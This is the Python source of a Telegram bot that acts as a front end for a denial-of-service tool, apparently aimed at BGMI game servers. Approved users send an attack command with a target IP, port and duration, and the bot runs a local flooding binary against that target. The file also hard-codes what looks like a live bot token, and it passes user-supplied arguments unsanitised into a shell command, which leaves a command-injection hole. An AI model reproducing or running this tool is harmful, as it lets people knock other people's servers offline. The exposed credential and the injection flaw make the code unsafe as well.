import asyncio
import subprocess
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive

keep_alive()

TELEGRAM_BOT_TOKEN = '7660887190:AAGSRnUfM0EkabRy22tMeKxAKQu9LzPTHN0'
ADMIN_USER_ID = 7352008650
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*♻️WELCOME TO THE BATTLEFIELD! 🔥*\n\n"
        "*✅USE /attack <ip> <port> <duration>*\n"
        "*🔗JOIN:- @ROXZ_GAMING*\n"
        "*♻️ Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ YOU NEED ADMIN APPROVAL TO USE THIS COMMAND.\n\n🔗JOIN:- BGMI :- @bgmiindiaofficial1 🚀*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ USER {target_user_id} added✅.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ USER {target_user_id} REMOVED♻️.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid command! Use add or rem.*", parse_mode='Markdown')

async def chmod_command(update: Update, context: CallbackContext):
    """Command to give execute permissions to all files in current directory"""
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    # Only admin can use this command for security
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ ONLY ADMIN CAN USE THIS COMMAND!*", parse_mode='Markdown')
        return
    
    try:
        # Get current working directory
        cwd = os.getcwd()
        
        # Execute chmod +x *
        process = await asyncio.create_subprocess_shell(
            "chmod +x *",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode == 0:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*✅ SUCCESS! Execute permissions added to all files in:*\n`{cwd}`\n\n*🔗@ROXZ_GAMING*", 
                parse_mode='Markdown'
            )
        else:
            error_msg = stderr.decode() if stderr else "Unknown error"
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*❌ ERROR: Failed to execute chmod*\n`{error_msg}`", 
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ ERROR: {str(e)}*", 
            parse_mode='Markdown'
        )

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ERROR DURING THE ATTACK 🚀: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*♻️ ATTACK COMPLETED! 🚀*\n*THANK YOU FOR SUPPORTING US✅!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ YOU NEED TO BE APPROVED TO USE THIS BOT♻️.\n\nOWNER:- @Roxz_gaming 🚀*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ ANOTHER ATTACK IS ALREADY IN PROGRESS⛔. ♻️PLEASE WAIT♻️.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ ATTACK LAUNCHED! ⚔️*\n"
        f"*🎯 TARGET: {ip}:{port}*\n"
        f"*🕒 DURATION: {duration} seconds*\n"
        f"*🔥 ANTIBAN PROXY SERVER STARTING ♻️*\n\n"
        f"*🔗@ROXZ_GAMING*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("chmod", chmod_command))  # Added chmod command handler
    application.run_polling()

if __name__ == '__main__':
    main()